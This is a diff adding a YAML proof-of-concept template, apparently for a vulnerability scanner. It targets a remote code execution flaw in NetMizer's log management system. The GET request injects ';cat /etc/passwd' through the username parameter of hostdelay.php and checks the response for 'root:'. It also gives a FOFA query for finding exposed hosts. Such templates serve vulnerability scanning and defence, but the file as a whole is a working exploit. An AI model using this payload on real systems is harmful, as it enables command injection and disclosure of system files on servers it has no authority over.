@@ -1,0 +1,15 @@
+id: poc-yaml-netmizer-log-ms-hostdelay-php-rce
+info:
+  name: NetMizer 日志管理系统 hostdelay.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: NetMizer 日志管理系统
+  fofa: app="NetMizer-日志管理系统"
+requests:
+- method: GET
+  path: /data/chart/hostdelay.php?action=list&username=;cat+/etc/passwd
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"root:")
+    && contains(body,"/bin") && !contains(body,"<")
+variables: {}
+transport: http
